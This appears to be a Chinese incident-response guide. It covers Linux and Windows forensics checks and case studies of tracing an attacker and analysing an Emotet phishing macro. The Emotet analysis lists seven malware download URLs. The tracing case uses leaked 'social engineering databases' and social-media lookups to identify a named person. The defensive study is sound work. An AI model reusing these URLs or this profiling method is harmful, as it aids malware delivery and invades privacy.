\u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u968f\u7740\u7528\u6237\u7684\u767b\u5f55\u548c\u6ce8\u9500\u4e0d\u65ad\u53d8\u5316\uff0c\u53ea\u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u6765\u67e5\u8be2 /var/log/secure \u8bb0\u5f55\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\uff0c\u6bd4\u5982SSH\u767b\u5f55\uff0csu\u5207\u6362\u7528\u6237\uff0csudo\u6388\u6743\uff0c\u751a\u81f3\u6dfb\u52a0\u7528\u6237\u548c\u4fee\u6539\u7528\u6237\u5bc6\u7801\u90fd\u4f1a\u8bb0\u5f55\u5728\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d Web\u8bbf\u95ee\u65e5\u5fd7\u901a\u5e38\u4e3aaccess.log\u6587\u4ef6\u53ef\u4ee5\u4f7f\u7528find\u547d\u4ee4\u8fdb\u884c\u67e5\u627e \u67e5\u627e\u6700\u8fd1\u4fee\u6539\u8fc7\u7684\u6587\u4ef6\u547d\u4ee4 \u4f8b\uff1afind ./* -mmin -5 Tips\uff1a mmin\u5206\u949f mtime \u5929 \u65e5\u5fd7\u5206\u6790\u5c0f\u6280\u5de7\uff1a \u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a grep \\\"Accepted \\\" /var/log/secure | awk \\'{print $11}\\' | sort | uniq -c | sort -nr | more \u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a grep \\\"Accepted \\\" /var/log/secure | awk \\'{print $1,$2,$3,$9,$11}\\' Webshell\u67e5\u627e \u00b6 \u6cb3\u9a6c webshell\uff1a http://www.shellpub.com Windows \u00b6 \u68c0\u67e5\u7cfb\u7edf\u8d26\u53f7\u5b89\u5168 \u00b6 1\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u53ef\u7591\u8d26\u53f7\u3001\u65b0\u589e\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a\u6253\u5f00 cmd \u7a97\u53e3\uff0c\u8f93\u5165 lusrmgr.msc \u547d\u4ee4\uff0c\u67e5\u770b\u662f\u5426\u6709\u65b0\u589e/\u53ef\u7591\u7684\u8d26\u53f7\uff0c\u5982\u6709\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\uff08Administrators\uff09\u91cc\u7684\u65b0\u589e\u8d26\u6237\uff0c\u5982\u6709\uff0c\u8bf7\u7acb\u5373\u7981\u7528\u6216\u5220\u9664\u6389\u3002 2\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u9690\u85cf\u8d26\u53f7\u3001\u514b\u9686\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u6253\u5f00\u6ce8\u518c\u8868 \uff0c\u67e5\u770b\u7ba1\u7406\u5458\u5bf9\u5e94\u952e\u503c\u3002 b\u3001\u4f7f\u7528D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u96c6\u6210\u4e86\u5bf9\u514b\u9686\u8d26\u53f7\u68c0\u6d4b\u7684\u529f\u80fd\u3002 3\u3001\u7ed3\u5408\u65e5\u5fd7\uff0c\u67e5\u770b\u7ba1\u7406\u5458\u767b\u5f55\u65f6\u95f4\u3001\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\u5f02\u5e38\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001Win+R \u6253\u5f00\u8fd0\u884c\uff0c\u8f93\u5165\\\"eventvwr.msc\\\"\uff0c\u56de\u8f66\u8fd0\u884c\uff0c\u6253\u5f00\"\u4e8b\u4ef6\u67e5\u770b\u5668\"\u3002 b\u3001\u5bfc\u51fa Windows \u65e5\u5fd7 -- \u5b89\u5168\uff0c\u5229\u7528\u5fae\u8f6f\u5b98\u65b9\u5de5\u5177 Log Parser \u8fdb\u884c\u5206\u6790\u3002 \u7aef\u53e3\u67e5\u8be2 \u00b6 1\u3001\u68c0\u67e5\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u662f\u5426\u6709\u8fdc\u7a0b\u8fde\u63a5\u3001\u53ef\u7591\u8fde\u63a5\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u4f7f\u7528netstat -ano \u547d\u4ee4\u67e5\u770b\u76ee\u524d\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u5b9a\u4f4d\u53ef\u7591\u7684 ESTABLISHED b\u3001\u6839\u636e netstat \u547d\u4ee4\u5b9a\u4f4d\u51fa\u7684 PID \u7f16\u53f7\uff0c\u518d\u901a\u8fc7 tasklist \u547d\u4ee4\u8fdb\u884c\u8fdb\u7a0b\u5b9a\u4f4d tasklist | findstr \\\"PID\\\" \u8fdb\u7a0b\u67e5\u8be2 \u00b6 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u5f00\u59cb -- \u8fd0\u884c -- \u8f93\u5165 msinfo32 \u547d\u4ee4\uff0c\u4f9d\u6b21\u70b9\u51fb \\\"\u8f6f\u4ef6\u73af\u5883 -- \u6b63\u5728\u8fd0\u884c\u4efb\u52a1\\\" \u5c31\u53ef\u4ee5\u67e5\u770b\u5230\u8fdb\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6bd4\u5982\u8fdb\u7a0b\u8def\u5f84\u3001\u8fdb\u7a0bID\u3001\u6587\u4ef6\u521b\u5efa\u65e5\u671f\u4ee5\u53ca\u542f\u52a8\u65f6\u95f4\u7b49\u3002 b\u3001\u6253\u5f00D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u8fdb\u7a0b\u67e5\u770b\uff0c\u5173\u6ce8\u6ca1\u6709\u7b7e\u540d\u4fe1\u606f\u7684\u8fdb\u7a0b\u3002 c\u3001\u901a\u8fc7\u5fae\u8f6f\u5b98\u65b9\u63d0\u4f9b\u7684 Process Explorer \u7b49\u5de5\u5177\u8fdb\u884c\u6392\u67e5 \u3002 d\u3001\u67e5\u770b\u53ef\u7591\u7684\u8fdb\u7a0b\u53ca\u5176\u5b50\u8fdb\u7a0b\u3002\u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u4ee5\u4e0b\u5185\u5bb9\uff1a \u6ca1\u6709\u7b7e\u540d\u9a8c\u8bc1\u4fe1\u606f\u7684\u8fdb\u7a0b \u6ca1\u6709\u63cf\u8ff0\u4fe1\u606f\u7684\u8fdb\u7a0b \u8fdb\u7a0b\u7684\u5c5e\u4e3b \u8fdb\u7a0b\u7684\u8def\u5f84\u662f\u5426\u5408\u6cd5 CPU \u6216\u5185\u5b58\u8d44\u6e90\u5360\u7528\u957f\u65f6\u95f4\u8fc7\u9ad8\u7684\u8fdb\u7a0b 3\u3001\u5c0f\u6280\u5de7\uff1a a\u3001\u67e5\u770b\u7aef\u53e3\u5bf9\u5e94\u7684 PID\uff1anetstat -ano | findstr \\\"port\\\" b\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684 PID\uff1a\u4efb\u52a1\u7ba1\u7406\u5668 -- \u67e5\u770b -- \u9009\u62e9\u5217 -- PID \u6216\u8005 tasklist | findstr \\\"PID\\\" c\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684\u7a0b\u5e8f\u4f4d\u7f6e\uff1a \u4efb\u52a1\u7ba1\u7406\u5668 -- \u9009\u62e9\u5bf9\u5e94\u8fdb\u7a0b -- \u53f3\u952e\u6253\u5f00\u6587\u4ef6\u4f4d\u7f6e \u8fd0\u884c\u8f93\u5165 wmic\uff0ccmd \u754c\u9762\u8f93\u5165 process d\u3001tasklist /svc \u8fdb\u7a0b -- PID -- \u670d\u52a1 e\u3001\u67e5\u770bWindows\u670d\u52a1\u6240\u5bf9\u5e94\u7684\u7aef\u53e3\uff1a %systemroot%/system32/drivers/etc/services\uff08\u4e00\u822c %systemroot% \u5c31\u662f C:\\Windows \u8def\u5f84\uff09 \u68c0\u67e5\u542f\u52a8\u9879\u3001\u8ba1\u5212\u4efb\u52a1\u3001\u670d\u52a1 \u00b6 1\u3001\u68c0\u67e5\u670d\u52a1\u5668\u662f\u5426\u6709\u5f02\u5e38\u7684\u542f\u52a8\u9879\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u6240\u6709\u7a0b\u5e8f\u3011>\u3010\u542f\u52a8\u3011\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6b64\u76ee\u5f55\u5728\u662f\u4e00\u4e2a\u7a7a\u76ee\u5f55\uff0c\u786e\u8ba4\u662f\u5426\u6709\u975e\u4e1a\u52a1\u7a0b\u5e8f\u5728\u8be5\u76ee\u5f55\u4e0b\u3002 b\u3001\u5355\u51fb\u5f00\u59cb\u83dc\u5355 >\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 msconfig\uff0c\u67e5\u770b\u662f\u5426\u5b58\u5728\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u662f\u5219\u53d6\u6d88\u52fe\u9009\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u5e76\u5230\u547d\u4ee4\u4e2d\u663e\u793a\u7684\u8def\u5f84\u5220\u9664\u6587\u4ef6\u3002 c\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 regedit\uff0c\u6253\u5f00\u6ce8\u518c\u8868\uff0c\u67e5\u770b\u5f00\u673a\u542f\u52a8\u9879\u662f\u5426\u6b63\u5e38\uff0c\u7279\u522b\u6ce8\u610f\u5982\u4e0b\u4e09\u4e2a\u6ce8\u518c\u8868\u9879\uff1a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce Webshell \u00b6 \u4f7f\u7528D\u76fe\u8fdb\u884c\u5168\u76d8\u626b\u63cf\uff0c\u5bf9\u811a\u672c\u6587\u4ef6\u8fdb\u884c\u4eba\u5de5\u5224\u65ad\u3002 \u5b9e\u6218\u7bc7 \u00b6 \u672c\u7bc7\u5185\u5bb9\u4e3b\u8981\u4ee5\\\"2020HW\\\"\u884c\u52a8\u53d1\u751f\u7684\u771f\u5b9e\u653b\u51fb\u4e8b\u4ef6\u4e3a\u4e3b\uff0c\u76ee\u7684\u662f\u7528\u5b9e\u6218\u6848\u5217\u7ed9\u5927\u5bb6\u6700\u76f4\u89c2\u7684\u611f\u53d7\uff0c\u90e8\u5206\u5185\u5bb9\u5df2\u8131\u654f\u3002 1.web\u653b\u51fb\u6eaf\u6e90\u7bc7 \u00b6 \uff081\uff099.13\u65e5\uff0c18:10:43\u5206\u871c\u7f50\u8bbe\u5907\u544a\u8b66\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u5bf9\u81ea\u5b9a\u4e49\u871c\u7f50\u754c\u9762\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u5728\u7814\u5224\u65f6\u53d1\u73b0\u8be5\u653b\u51fb\u8005IP\u5730\u5740\u4e3a\u603b\u90e8\u7edf\u4e00\u4e0b\u53d1\u7684\u9ad8\u5371\u9884\u8b66IP\uff0c\u968f\u7acb\u5373\u5bf9\u5176\u5c55\u5f00\u653b\u51fb\u6eaf\u6e90\u5de5\u4f5c\u3002 \u6211\u4eec\u83b7\u53d6\u5230IP\u540e\uff0c\u9996\u5148\u5bf9\u5176\u8fdb\u884c\u5a01\u80c1\u60c5\u62a5\u6536\u96c6\uff0c\u63a8\u8350\u4f7f\u7528\u5fae\u6b65\u5728\u7ebf\u5a01\u80c1\u60c5\u62a5\u793e\u533a\u3002\u5982\u56fe\uff1a \uff082\uff09\u901a\u8fc7ping\u8be5\u57df\u540d\u6765\u83b7\u53d6\u5176\u4f7f\u7528\u7684\u771f\u5b9e\u5730\u5740\uff0c\u5f97\u5230\u573061.188.254.133\uff0c\u901a\u8fc7\u8be5\u5730\u5740\u53cd\u67e5\u57df\u540d\u5f97\u5230xxooxxoo.xyz\uff0c\u518d\u67e5\u8be2\u8be5\u57df\u540d\u7684whois\u4fe1\u606f\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u653b\u51fb\u8005\u7684\u521d\u6b65\u4fe1\u606f\u3002 \u5728\u5b9e\u6218\u8fc7\u7a0b\u4e2d\uff0c\u5f80\u5f80\u6211\u4eec\u53cd\u67e5IP\u5730\u5740\u83b7\u53d6\u5230\u7684\u57df\u540d\u662f\u83b7\u53d6\u4e0d\u5230\u6709\u6548\u7684\u5229\u7528\u4fe1\u606f\u7684\uff0c\u6b64\u65f6\u6211\u4eec\u9700\u8981\u66f4\u52a0\u8010\u5fc3\uff0c\u67e5\u8be2\u5176\u5386\u53f2\u6ce8\u518c\u57df\u540d\uff0c\u901a\u8fc7\u4e0d\u65ad\u7684IP\u53cd\u67e5\uff0c\u57df\u540d\u53cd\u67e5\u6765\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\uff0c\u6e17\u900f\u7684\u672c\u8d28\u662f\u4fe1\u606f\u6536\u96c6\uff0c\u6eaf\u6e90\u7684\u672c\u8eab\u4e5f\u662f\u4fe1\u606f\u6536\u96c6\u7684\u4e00\u79cd\u4f53\u73b0\u3002 \uff083\uff09\u901a\u8fc7\u524d\u4e24\u6b65\u7684\u5206\u6790\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u653b\u51fb\u8005\u7684\u624b\u673a\u53f7\u4e0e\u59d3\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u793e\u4ea4\u5e73\u53f0\u53caAPP\u6765\u9a8c\u8bc1\u653b\u51fb\u8005\u7684\u771f\u5b9e\u6027\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u793e\u5de5\u5e93\u6765\u83b7\u53d6\u653b\u51fb\u8005\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u793e\u5de5\u5e93\u6e90\u81eaTelegram\uff08\u7531\u4e8e\u9700\u8981\u7ffb\u5899\u8fd9\u91cc\u4e0d\u518d\u63d0\u4f9b\u622a\u56fe\uff0c\u5927\u5bb6\u81ea\u884c\u67e5\u627e\uff09\u3002 1.\u652f\u4ed8\u5b9d\u901a\u8fc7\u8f6c\u8d26\u529f\u80fd\u53ef\u4ee5\u9a8c\u8bc1\u5176\u59d3\u540d\u771f\u5b9e\u6027\u3002 \u901a\u8fc7QQ\u53f7\uff0c\u8fdb\u5165QQ\u7a7a\u95f4\u83b7\u53d6\u5230\u5927\u91cf\u4e2a\u4eba\u4fe1\u606f\uff08\u670b\u53cb\u5708\uff0cQQ\u7a7a\u95f4\u8fd9\u79cd\u793e\u4ea4\u5708\u5b50\u5927\u5bb6\u5c3d\u91cf\u8fd8\u662f\u8bbe\u7f6e\u4e3a\u4e0d\u5141\u8bb8\u964c\u751f\u4eba\u8bbf\u95ee\uff09 \u6b64\u65f6\u53ef\u4ee5\u5224\u65ad\u653b\u51fb\u8005\u66fe\u5c31\u804c\u4e8e\u817e\u8baf\u3002\u540c\u65f6\u901a\u8fc7QQ\u7a7a\u95f4\u6211\u4eec\u8fd8\u53d1\u73b0\u653b\u51fb\u8005\u66fe\u5f00\u53d1\u8fc7\u5fae\u4fe1\u516c\u4f17\u53f7\uff0c\u901a\u8fc7\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u83b7\u53d6\u5230\u7684scjtqs\u5173\u952e\u8bcd\uff0c\u6211\u4eec\u83b7\u53d6\u5230\u4e86\u653b\u51fb\u8005\u7684github\u4fe1\u606f\uff0c\u4e00\u4e9b\u5f00\u53d1\u9879\u76ee\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u8bc1\u660e\u653b\u51fb\u8005\u662fIT\u884c\u4e1a\u4ece\u4e1a\u8005\u3002 2.\u9493\u9c7c\u90ae\u4ef6\u5206\u6790\u7bc7 \u00b6 \u9493\u9c7c\u90ae\u4ef6\u653b\u51fb\u591a\u4e3a\u4e24\u79cd\uff0c\u4e00\u662f\u5e26\u6709\u9644\u4ef6\u7684word\u5b8f\u75c5\u6bd2\uff0c\u4e8c\u662f\u5f15\u5bfc\u53d7\u5bb3\u8005\u8fdb\u5165\u9493\u9c7c\u7f51\u7ad9\u6765\u83b7\u53d6\u53d7\u5bb3\u8005\u7684\u654f\u611f\u4fe1\u606f\u3002\u8bc6\u522b\u9493\u9c7c\u90ae\u4ef6\u9996\u5148\u5173\u6ce8\u53d1\u4ef6\u4eba\u7684\u5730\u5740\u4fe1\u606f\uff0c\u4ee5\u53ca\u653b\u51fb\u8005\u53d1\u8fc7\u6765\u7684\u6076\u610f\u94fe\u63a5\u5730\u5740\uff08\u5c06\u9f20\u6807\u5149\u6807\u79fb\u52a8\u81f3\u6076\u610f\u94fe\u63a5\u5730\u5740\u5728\u6d4f\u89c8\u5668\u5de6\u4e0b\u89d2\u53ef\u4ee5\u770b\u5230\u76f8\u5173\u5730\u5740\uff09\u3002\u540c\u65f6\u5728\u5927\u5bb6\u65e5\u5e38\u5de5\u4f5c\u4e2d\u8981\u63d0\u9ad8\u81ea\u5df1\u7684\u5b89\u5168\u610f\u8bc6\uff0c\u4e0d\u8981\u4f7f\u7528\u4ee5\u81ea\u5df1\u751f\u65e5\u547d\u540d\u7684\u5bc6\u7801\u6216\u8005\u7b80\u5355\u7684\u5bc6\u7801\u7ec4\u5408\uff0c\u4e0d\u8981\u518d\u4e92\u8054\u7f51\u4e2d\u7ecf\u5e38\u4f7f\u7528\u4e2a\u4eba\u4fe1\u606f\u6765\u8fdb\u884c\u6ce8\u518c\uff0c\u5f80\u5f80\u653b\u51fb\u8005\u518d\u83b7\u53d6\u5230\u5185\u90e8\u4eba\u5458\u90ae\u7bb1\u4e4b\u540e\u8fdb\u884c\u7684\u653b\u51fb\u4f1a\u4f7f\u5185\u90e8\u5458\u5de5\u5927\u9762\u79ef\u4e2d\u62db\u3002 \u4e00\u3001\u4e8b\u4ef6\u63cf\u8ff0\uff1a 2020\u5e7409\u670817\u65e5 17:11:00\u6211\u65b9\u62ff\u5230\u9493\u9c7c\u90ae\u4ef6\u6837\u672c\uff0c\u968f\u7acb\u5373\u5bf9\u5176\u5c55\u5f00\u5206\u6790\u5de5\u4f5c\u3002\u901a\u8fc7\u4e91\u6c99\u7bb1\u5bf9\u6837\u672c\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u5176\u4e3aword\u5b8f\u75c5\u6bd2\u3002 \u5c06\u6587\u4ef6\u4e0a\u4f20\u81f3\u4e91\u6c99\u7bb1\uff0c\u53ef\u53d1\u73b0\u8be5\u6587\u4ef6\u4e3a\u6076\u610f\u6587\u4ef6\u3002 \u5206\u6790\u603b\u7ed3\u8be5\u6587\u4ef6\u6267\u884c\u6d41\u7a0b\u5982\u4e0b\uff1a\u8fd0\u884c\u6587\u4ef6\u540e\u4f1a\u901a\u8fc7powershell\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u4e0b\u8f7d\u4e86\u540d\u4e3aK2ngq9rh.exe\u7684\u6076\u610f\u7a0b\u5e8f\uff0c\u8be5\u6076\u610f\u7a0b\u5e8f\u8fd0\u884c\u4f1a\u6267\u884c\u591a\u9879\u6076\u610f\u884c\u4e3a\u5e76\u5c06\u81ea\u8eab\u5220\u9664\u3002 \u6253\u5f00\u6587\u6863\u524d\u5148\u7981\u7528\u5b8f\uff0c\u9632\u6b62word\u5b8f\u4ee3\u7801\u6267\u884c\u5bf9\u673a\u5668\u8fdb\u884c\u9ad8\u5371\u64cd\u4f5c\uff0c\u5bf9\u5b8f\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u3002 \u5206\u4e3aOd7aj7ii3yu\u548cK946e0s3qiq0\u4e24\u90e8\u5206\u5b8f\u4ee3\u7801\u3002 Od7aj7ii3yu \u51fd\u6570\u4e3a\u4e00\u4e2a\u79c1\u6709\u65b9\u6cd5\u5728\u6587\u6863\u6253\u5f00\u65f6\u521b\u5efa\u4e866\u4e2a\u5b57\u7b26\u4e32\u6570\u7ec4\u5bf9\u8c61\uff0c\u4e3a\u540e\u7eed\u64cd\u4f5c\u505a\u51c6\u5907\u3002 K946e0s3qiq0\u4e3a\u6076\u610f\u5b8f\u4ee3\u7801\u7684\u4e3b\u4f53\u7a0b\u5e8f\uff0c\u4ee3\u7801\u4e2d\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u4f5c\u4e3a\u5b57\u5178\uff0c\u4f7f\u7528mid\u3001trim\u3001split\u51fd\u6570\u504f\u79fb\u5bf9\u65e0\u5e8f\u5b57\u7b26\u4e32\u8fdb\u884c\u53d6\u503c\u3002 \u5bf9\u5176\u4e2d\u4e00\u4e2a\u90e8\u5206\u9a8c\u8bc1\u5982\u4e0b\uff1a \u7ee7\u7eed\u8ffd\u8e2a\u4ee3\u7801,\u53d1\u73b0\u516c\u4ee3\u7801\u4f1a\u8c03\u7528wmi(winmgmts),\u4f7f\u7528win32_process\u63a5\u53e3\u83b7\u53d6\u8ba1\u7b97\u673a\u7684\u7cfb\u7edf\u4fe1\u606f\u3002 \u7ee7\u7eed\u8ddf\u8e2a\u4ee3\u7801\u53d1\u73b0\u4e00\u4e2a\u6bd4\u8f83\u6709\u610f\u601d\u7684\u4e8b\u60c5\uff0c\u5728\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u4f1a\u51fa\u73b0pizdec \u5b57\u6837\u7684\u5b57\u7b26\u4e32\uff0c\u67e5\u8be2\u540e\u662f\u4fc4\u7f57\u65af\u8bed\uff0c\u6000\u7591\u8be5\u9493\u9c7c\u90ae\u4ef6\u4e0e\u4fc4\u7f57\u65af\u6709\u5173\u3002 \u7ee7\u7eed\u5206\u6790\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u5b57\u7b26\u4e32\u89e3\u5bc6\u540e\u4f1a\u4f7f\u7528powershell -encode \u6267\u884c\u52a0\u5bc6\u540e\u7684\u4ee3\u7801\u3002 \u8be5\u52a0\u5bc6\u540e\u7684\u4ee3\u7801\u67092\u90e8\u5206\u6784\u6210\uff1a \u660e\u6587\u4f7f\u7528\".\"\u3001\"*\"\u3001\"/\"\u3001\" \"\u7b49\u505a\u6df7\u6dc6 \u6df7\u6dc6\u540e\u4f7f\u7528base64\u52a0\u5bc6 \u9006\u5411\u8be5\u8fc7\u7a0b\u8fd8\u539f\u660e\u6587 \u5206\u6790\u5b8f\u4ee3\u7801\u91ca\u653e\u7684exe\u6587\u4ef6\uff0c\u5728\u51fd\u6570\u4e2d\u53d1\u73b0\u4e86\u4f5c\u8005\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\u540d\u79f0\u4e3alhxXfY9mIrDZ\uff0c\u7ed3\u5408\u5b8f\u4ee3\u7801\u4e2d\u7684pizdec\u3002\u8c37\u6b4c\u641c\u7d22\u540e\u53d1\u73b02020\u5e749\u670818\u53f7\u7684\u4e00\u4e2a\u6c99\u7bb1\u62a5\u544a\u3002 \u62a5\u544a\u5982\u4e0b \u6728\u9a6c\u903b\u8f91\u5206\u4e3a\u52a0\u8f7d\u5668\u548c\u6728\u9a6c\u6838\u5fc3\uff0c\u5728\u52a0\u8f7d\u5668\u8fd0\u884c\u65f6\uff0c\u4e5f\u5c31\u662fqct8u1hKuXXwoP.exe\u4f1a\u5148\u83b7\u53d6\u7cfb\u7edf\u7684\u57fa\u672c\u4fe1\u606f\u3001\u662f\u5426\u4e3a\u8c03\u8bd5\u73af\u5883\u7b49\u3002 \u5224\u65ad\u662f\u5426\u5728debug\u73af\u5883\u4e0b \u5982\u679c\u662f\u8c03\u8bd5\u73af\u5883\u5c31\u4f1asleep\uff0c\u4e0d\u6267\u884c\u540e\u7eed\u52a8\u4f5c\u3002 \u83b7\u53d6\u7cfb\u7edf\u7684cpu \u548c oem\u4fe1\u606f \u6839\u636e\u62a5\u544a\u5185\u5bb9\u53d1\u73b0\u5982\u679c\u52a0\u8f7d\u5668\u8fd0\u884c\u6b63\u5e38\u4f1a\u4e0b\u8f7d\u6728\u9a6c\u6838\u5fc3\u3002 \u62fc\u63a5\u4e0b\u8f7d\u5730\u5740\uff0c\u4e0b\u8f7d\u6728\u9a6c\u5206\u6790\u3002\u5728 ida\u4e2d\u5206\u6790\u53d1\u73b0\u6728\u9a6c\u4f5c\u8005\u6ca1\u6709\u5220\u53bb\u672c\u673a\u7684\u8c03\u8bd5\u8def\u5f84\u3002 \u6839\u636e\u6b64\u8def\u5f84\u4e3a\u5173\u952e\u5b57\u641c\u7d22\u53ef\u4ee5\u786e\u5b9a\u8be5\u9493\u9c7c\u90ae\u4ef6\u7684\u7ec4\u7ec7\u4e3a Emotet Emotet\u6076\u610f\u8f6f\u4ef6\u7684\u7b2c\u4e00\u4e2a\u7248\u672c\u65e9\u57282014\u5e74\u5c31\u88ab\u5e7f\u6cdb\u53d1\u73b0\uff0c\u5176\u76ee\u7684\u662f\u901a\u8fc7\u62e6\u622a\u4e92\u8054\u7f51\u6d41\u91cf\u6765\u7a83\u53d6\u94f6\u884c\u51ed\u8bc1\u3002\u9996\u6b21\u5728\u91ce\u5916\u53d1\u73b0Emotet\u65f6\uff0c\u8be5\u6076\u610f\u8f6f\u4ef6\u4ec5\u4f7f\u7528\u5176\u672c\u673a\u4fe1\u606f\u7a83\u53d6\u5de5\u5177\u96c6\uff0c\u4e3b\u8981\u9488\u5bf9\u5fb7\u56fd\u548c\u5965\u5730\u5229\u7684\u94f6\u884c\u3002Emotet\u80cc\u540e\u7684\u8fd0\u8425\u56e2\u961f\u662fMealybug\u3002\u8be5\u56e2\u961f \u662f\u4e00\u4e2a\u7f51\u7edc\u72af\u7f6a\u7ec4\u7ec7\uff0c\u81ea2014\u5e74\u4ee5\u6765\u4e00\u76f4\u4fdd\u6301\u6d3b\u8dc3\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5176\u4f7f\u7528\u7684\u81ea\u5b9a\u4e49\u6076\u610f\u8f6f\u4ef6Trojan.Emotet\u6765\u8bc6\u522b\u5b83\u3002\u8fd1\u51e0\u5e74\u6765\uff0cMealybug\u4f3c\u4e4e\u5df2\u7ecf\u6539\u53d8\u4e86\u5176\u5546\u4e1a\u6a21\u5f0f\uff0c\u4ece\u9488\u5bf9\u6b27\u6d32\u7684\u94f6\u884c\u5ba2\u6237\u8f6c\u53d8\u4e3a\u4e86\u4f7f\u7528\u5176\u57fa\u7840\u8bbe\u65bd\u4e3a\u5168\u7403\u5176\u4ed6\u5a01\u80c1\u884c\u4e3a\u8005\u63d0\u4f9b\u6076\u610f\u8f6f\u4ef6\u5305\u88c5\u548c\u4ea4\u4ed8\u670d\u52a1\u3002\u6b64\u6b21\u9493\u9c7c\u90ae\u4ef6\u653b\u51fb\uff0c\u662f\u9488\u5bf9\u4e8e\u653f\u5e9c\u4f01\u4e1a\u7684\u4e00\u6b21APT\u653b\u51fb\u3002 \u5206\u6790\u6587\u4ef6\u6267\u884c\u5185\u5bb9\uff0c\u53ef\u4ee5\u53d1\u73b0\u8be5\u6076\u610f\u6587\u4ef6\u4f1a\u6267\u884c\u591a\u79cd\u6076\u610f\u884c\u4e3a\uff0c\u5305\u62ec\u4ee3\u7801\u6df7\u6dc6\u3001\u91ca\u653e\u6076\u610f\u6587\u4ef6\u3001\u521b\u5efa\u53ef\u4ee5\u8fdb\u7a0b\u7b49\uff1a \u6587\u4ef6\u6267\u884c\u8fc7\u7a0b\u4e2d\u53ef\u89c2\u5bdf\u5230\u5176\u5b9e\u901a\u8fc7powershell\u8fdb\u884c\u6570\u636e\u7684\u4f20\u8f93\u5de5\u4f5c\u3002 \u901a\u8fc7\u5bf9\u6587\u4ef6\u6267\u884c\u4e2d\u7684powershell\u4ee3\u7801\u8fdb\u884c\u89e3\u7801\u5206\u6790\uff0c\u5f97\u5230\u6e90\u4ee3\u7801\u3002 \u89e3\u7801\u5f97\u5230 \u5bf9\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u5f97\u77e5\u4ee3\u7801\u5185\u5bb9\u4e3a\u8bf7\u6c42\u4ee5\u4e0bURL http://theccwork.com/mail.theccwork.com/IJp/ \\ https://www.retirementprofessional.com/wp-admin/tjQ/ \\ https://writingfromling.live/wp-admin/GL/ \\ http://shahqutubuddin.org/ix/ \\ https://jumpstart.store/wp-admin/q/ \\ https://aidenshirt.com/wp-admin/e6f/ \\ https://edenrug.store/wp-admin/H/ \u5bf9\u4ee5\u4e0aURL\u8fdb\u884c\u6eaf\u6e90\u5206\u6790\u53d1\u73b0\u7ad9\u70b9\u5747\u4e3awordpress\u6a21\u677f\uff0cwordpress\u4e3a\u6700\u65b0\u7248\u672c\u65e0\u6cd5\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\u3002\u90e8\u5206\u4fe1\u606f\u5982\u4e0b\uff1a 